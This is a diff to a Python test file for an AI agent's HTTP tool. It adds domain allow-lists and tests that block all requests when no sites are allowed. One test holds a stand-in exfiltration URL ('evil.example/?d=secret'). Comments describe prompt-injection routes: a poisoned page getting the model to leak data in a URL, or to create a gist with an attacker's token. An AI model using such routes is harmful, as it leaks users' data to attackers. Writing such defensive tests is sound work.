@@ -61,9 +61,9 @@ def _text(result: dict[str, Any]) -> str:
 async def test_a_get_returns_status_and_pretty_json(web) -> None:
     responses, sent = web
     responses.append(httpx.Response(200, json={"items": [1, 2]}))
-    result = await build_http_tool(HttpRequestTool(enabled=True)).handler(
-        {"url": "https://api.example.com/items"}
-    )
+    result = await build_http_tool(
+        HttpRequestTool(enabled=True, allowed_domains=["example.com"])
+    ).handler({"url": "https://api.example.com/items"})
     assert not result.get("is_error")
     text = _text(result)
     assert text.startswith("HTTP 200 OK\napplication/json")
@@ -74,9 +74,9 @@ async def test_a_get_returns_status_and_pretty_json(web) -> None:
 async def test_an_error_status_is_marked_as_an_error(web) -> None:
     responses, _ = web
     responses.append(httpx.Response(404, text="missing"))
-    result = await build_http_tool(HttpRequestTool(enabled=True)).handler(
-        {"url": "https://api.example.com/nope"}
-    )
+    result = await build_http_tool(
+        HttpRequestTool(enabled=True, allowed_domains=["example.com"])
+    ).handler({"url": "https://api.example.com/nope"})
     assert result["is_error"] is True
     assert "HTTP 404" in _text(result)
 
@@ -86,18 +86,20 @@ async def test_a_binary_body_is_described_not_dumped(web) -> None:
     responses.append(
         httpx.Response(200, content=b"\x89PNG\r\n", headers={"content-type": "image/png"})
     )
-    result = await build_http_tool(HttpRequestTool(enabled=True)).handler(
-        {"url": "https://api.example.com/logo.png"}
-    )
+    result = await build_http_tool(
+        HttpRequestTool(enabled=True, allowed_domains=["example.com"])
+    ).handler({"url": "https://api.example.com/logo.png"})
     assert "(binary body not shown)" in _text(result)
     assert "PNG" not in _text(result)
 
 
 async def test_an_internal_address_is_blocked_with_a_reason(web) -> None:
     _, sent = web
-    result = await build_http_tool(HttpRequestTool(enabled=True)).handler(
-        {"url": "http://internal.test/admin"}
-    )
+    # Allowed on purpose: being on the list never makes an internal address
+    # reachable.
+    result = await build_http_tool(
+        HttpRequestTool(enabled=True, allowed_domains=["internal.test"])
+    ).handler({"url": "http://internal.test/admin"})
     assert result["is_error"] is True
     assert _text(result).startswith("blocked:")
     assert sent == []
@@ -267,3 +269,50 @@ def test_the_approval_card_reads_like_a_request() -> None:
     assert text == (
         'POST https://api.example.com/items\nAuthorization: <redacted>\nX-Trace: 7\n\n{"name": "x"}'
     )
+
+
+# ── no allowed sites, no requests (Phase 7a.9) ───────────────
+
+
+async def test_with_no_allowed_sites_nothing_is_sent(web) -> None:
+    """An empty list used to mean any public site, and a GET runs unasked:
+    a poisoned page could have the model send data out in a URL."""
+    from app.agent.caps_http import NO_SITES
+
+    _, sent = web
+    tool = build_http_tool(HttpRequestTool(enabled=True))
+    for args in (
+        {"url": "https://api.example.com/items"},
+        {"url": "https://evil.example/?d=secret", "method": "GET"},
+        {"url": "https://api.example.com/items", "method": "POST", "body": "{}"},
+    ):
+        result = await tool.handler(args)
+        assert result["is_error"] is True and _text(result) == NO_SITES
+    assert sent == [], "nothing left the server"
+    assert "No sites are allowed yet" in tool.description
+
+
+async def test_a_list_of_only_blanks_allows_nothing(web) -> None:
+    _, sent = web
+    from app.agent.caps_http import NO_SITES
+
+    tool = build_http_tool(HttpRequestTool(enabled=True, allowed_domains=[" ", "*."]))
+    result = await tool.handler({"url": "https://api.example.com/items"})
+    assert result["is_error"] is True and sent == []
+    assert _text(result) == NO_SITES, "said as plainly as an empty list"
+    assert "No sites are allowed yet" in tool.description
+
+
+def test_sites_anyone_can_publish_on_are_named() -> None:
+    from app.agent.caps_http import open_domains
+
+    # Every github.com host counts: with an attacker's token in a header (from a
+    # poisoned page), the API itself creates a gist in their account.
+    assert open_domains(["github.com", "gist.github.com", "api.github.com"]) == [
+        "github.com",
+        "gist.github.com",
+        "api.github.com",
+    ]
+    assert open_domains(["google.com"]) == ["google.com"], "it covers docs.google.com"
+    assert open_domains(["x.webhook.site", "pastebin.com"]) == ["x.webhook.site", "pastebin.com"]
+    assert open_domains(["helpdesk.example.com", "api.example.org"]) == []
